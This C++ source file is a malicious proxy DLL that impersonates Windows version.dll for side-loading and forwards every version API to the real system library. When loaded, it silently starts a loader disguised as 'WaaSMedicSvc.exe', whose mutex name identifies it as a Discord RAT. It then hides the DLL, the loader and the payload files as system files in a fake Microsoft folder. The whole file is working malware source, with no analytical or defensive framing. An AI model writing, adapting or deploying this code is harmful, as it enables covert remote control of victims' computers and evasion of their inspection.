#include <windows.h>
#include <shlobj.h>
#include <strsafe.h>

#pragma comment(lib, "shell32.lib")

#define LOADER_NAME L"WaaSMedicSvc.exe"
#define PAYLOAD_NAME L"ProvData.db"
#define CACHE_DIR L"Cache"

static HMODULE g_realVersion = NULL;
static HMODULE g_selfModule = NULL;

static FARPROC RealProc(const char* name)
{
    if (!g_realVersion)
    {
#ifdef _WIN64
        g_realVersion = LoadLibraryW(L"C:\\Windows\\System32\\version.dll");
#else
        g_realVersion = LoadLibraryW(L"C:\\Windows\\SysWOW64\\version.dll");
#endif
    }
    return g_realVersion ? GetProcAddress(g_realVersion, name) : NULL;
}

static bool FileExistsW(const wchar_t* path)
{
    DWORD attrs = GetFileAttributesW(path);
    return attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY);
}

static void HideSystemPath(const wchar_t* path)
{
    DWORD attrs = GetFileAttributesW(path);
    if (attrs != INVALID_FILE_ATTRIBUTES)
    {
        SetFileAttributesW(path, (attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM) & ~FILE_ATTRIBUTE_READONLY);
    }
}

static bool GetPayloadRootDirectory(wchar_t* outPath, size_t outChars)
{
    wchar_t localAppData[MAX_PATH] = { 0 };
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData)))
    {
        return false;
    }

    return SUCCEEDED(StringCchPrintfW(outPath, outChars, L"%s\\Microsoft\\Windows\\AppReadiness", localAppData));
}

static void HideDeployedFiles(const wchar_t* rootDir)
{
    wchar_t path[MAX_PATH] = { 0 };

    StringCchPrintfW(path, MAX_PATH, L"%s\\" LOADER_NAME, rootDir);
    HideSystemPath(path);

    StringCchPrintfW(path, MAX_PATH, L"%s\\" PAYLOAD_NAME, rootDir);
    HideSystemPath(path);

    StringCchPrintfW(path, MAX_PATH, L"%s\\" CACHE_DIR, rootDir);
    HideSystemPath(path);

    StringCchPrintfW(path, MAX_PATH, L"%s\\" CACHE_DIR L"\\TokenProv.db", rootDir);
    HideSystemPath(path);

    StringCchPrintfW(path, MAX_PATH, L"%s\\" CACHE_DIR L"\\DeviceCache.db", rootDir);
    HideSystemPath(path);

    HideSystemPath(rootDir);
}

static void HideSelfDll()
{
    if (!g_selfModule)
    {
        return;
    }

    wchar_t selfPath[MAX_PATH] = { 0 };
    if (GetModuleFileNameW(g_selfModule, selfPath, MAX_PATH))
    {
        HideSystemPath(selfPath);
    }
}

static void LaunchRuntimeHost()
{
    HANDLE runningMutex = OpenMutexW(SYNCHRONIZE, FALSE, L"Global\\DiscordRAT_ShaherDev_v1");
    if (runningMutex)
    {
        CloseHandle(runningMutex);
        HideSelfDll();
        return;
    }

    wchar_t rootDir[MAX_PATH] = { 0 };
    wchar_t loaderExe[MAX_PATH] = { 0 };
    wchar_t payloadFile[MAX_PATH] = { 0 };
    wchar_t legacyLoader[MAX_PATH] = { 0 };
    wchar_t legacyPayload[MAX_PATH] = { 0 };

    if (!GetPayloadRootDirectory(rootDir, MAX_PATH))
    {
        return;
    }

    StringCchPrintfW(loaderExe, MAX_PATH, L"%s\\" LOADER_NAME, rootDir);
    StringCchPrintfW(payloadFile, MAX_PATH, L"%s\\" PAYLOAD_NAME, rootDir);
    StringCchPrintfW(legacyLoader, MAX_PATH, L"%s\\RuntimeHost.exe", rootDir);
    StringCchPrintfW(legacyPayload, MAX_PATH, L"%s\\core.bin", rootDir);

    const wchar_t* launchPath = loaderExe;
    if (!FileExistsW(loaderExe) || !FileExistsW(payloadFile))
    {
        if (FileExistsW(legacyLoader) && FileExistsW(legacyPayload))
        {
            launchPath = legacyLoader;
        }
        else
        {
            HideSelfDll();
            return;
        }
    }

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessW((wchar_t*)launchPath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, rootDir, &si, &pi))
    {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    HideSelfDll();
    HideDeployedFiles(rootDir);
}

DWORD WINAPI RunLoader(LPVOID)
{
    LaunchRuntimeHost();
    return 0;
}

extern "C"
{
    __declspec(dllexport) BOOL WINAPI Proxy_GetFileVersionInfoA(LPCSTR a, DWORD b, DWORD c, LPVOID d)
    {
        auto fn = (BOOL (WINAPI*)(LPCSTR, DWORD, DWORD, LPVOID))RealProc("GetFileVersionInfoA");
        return fn ? fn(a, b, c, d) : FALSE;
    }

    __declspec(dllexport) BOOL WINAPI Proxy_GetFileVersionInfoW(LPCWSTR a, DWORD b, DWORD c, LPVOID d)
    {
        auto fn = (BOOL (WINAPI*)(LPCWSTR, DWORD, DWORD, LPVOID))RealProc("GetFileVersionInfoW");
        return fn ? fn(a, b, c, d) : FALSE;
    }

    __declspec(dllexport) BOOL WINAPI Proxy_GetFileVersionInfoExA(DWORD flags, LPCSTR a, DWORD b, DWORD c, LPVOID d)
    {
        auto fn = (BOOL (WINAPI*)(DWORD, LPCSTR, DWORD, DWORD, LPVOID))RealProc("GetFileVersionInfoExA");
        return fn ? fn(flags, a, b, c, d) : FALSE;
    }

    __declspec(dllexport) BOOL WINAPI Proxy_GetFileVersionInfoExW(DWORD flags, LPCWSTR a, DWORD b, DWORD c, LPVOID d)
    {
        auto fn = (BOOL (WINAPI*)(DWORD, LPCWSTR, DWORD, DWORD, LPVOID))RealProc("GetFileVersionInfoExW");
        return fn ? fn(flags, a, b, c, d) : FALSE;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_GetFileVersionInfoSizeA(LPCSTR a, LPDWORD b)
    {
        auto fn = (DWORD (WINAPI*)(LPCSTR, LPDWORD))RealProc("GetFileVersionInfoSizeA");
        return fn ? fn(a, b) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_GetFileVersionInfoSizeW(LPCWSTR a, LPDWORD b)
    {
        auto fn = (DWORD (WINAPI*)(LPCWSTR, LPDWORD))RealProc("GetFileVersionInfoSizeW");
        return fn ? fn(a, b) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_GetFileVersionInfoSizeExA(DWORD flags, LPCSTR a, LPDWORD b)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPCSTR, LPDWORD))RealProc("GetFileVersionInfoSizeExA");
        return fn ? fn(flags, a, b) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_GetFileVersionInfoSizeExW(DWORD flags, LPCWSTR a, LPDWORD b)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPCWSTR, LPDWORD))RealProc("GetFileVersionInfoSizeExW");
        return fn ? fn(flags, a, b) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_VerFindFileA(DWORD a, LPCSTR b, LPCSTR c, LPCSTR d, LPSTR e, PUINT f, LPSTR g, PUINT h)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPCSTR, LPCSTR, LPCSTR, LPSTR, PUINT, LPSTR, PUINT))RealProc("VerFindFileA");
        return fn ? fn(a, b, c, d, e, f, g, h) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_VerFindFileW(DWORD a, LPCWSTR b, LPCWSTR c, LPCWSTR d, LPWSTR e, PUINT f, LPWSTR g, PUINT h)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPWSTR, PUINT, LPWSTR, PUINT))RealProc("VerFindFileW");
        return fn ? fn(a, b, c, d, e, f, g, h) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_VerInstallFileA(DWORD a, LPCSTR b, LPCSTR c, LPCSTR d, LPCSTR e, LPCSTR f, LPSTR g, PUINT h)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPSTR, PUINT))RealProc("VerInstallFileA");
        return fn ? fn(a, b, c, d, e, f, g, h) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_VerInstallFileW(DWORD a, LPCWSTR b, LPCWSTR c, LPCWSTR d, LPCWSTR e, LPCWSTR f, LPWSTR g, PUINT h)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPWSTR, PUINT))RealProc("VerInstallFileW");
        return fn ? fn(a, b, c, d, e, f, g, h) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_VerLanguageNameA(DWORD a, LPSTR b, DWORD c)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPSTR, DWORD))RealProc("VerLanguageNameA");
        return fn ? fn(a, b, c) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_VerLanguageNameW(DWORD a, LPWSTR b, DWORD c)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPWSTR, DWORD))RealProc("VerLanguageNameW");
        return fn ? fn(a, b, c) : 0;
    }

    __declspec(dllexport) BOOL WINAPI Proxy_VerQueryValueA(LPCVOID a, LPCSTR b, LPVOID* c, PUINT d)
    {
        auto fn = (BOOL (WINAPI*)(LPCVOID, LPCSTR, LPVOID*, PUINT))RealProc("VerQueryValueA");
        return fn ? fn(a, b, c, d) : FALSE;
    }

    __declspec(dllexport) BOOL WINAPI Proxy_VerQueryValueW(LPCVOID a, LPCWSTR b, LPVOID* c, PUINT d)
    {
        auto fn = (BOOL (WINAPI*)(LPCVOID, LPCWSTR, LPVOID*, PUINT))RealProc("VerQueryValueW");
        return fn ? fn(a, b, c, d) : FALSE;
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        g_selfModule = hModule;
        DisableThreadLibraryCalls(hModule);
        RealProc("GetFileVersionInfoW");
        HANDLE thread = CreateThread(NULL, 0, RunLoader, NULL, 0, NULL);
        if (thread)
        {
            CloseHandle(thread);
        }
    }

    return TRUE;
}
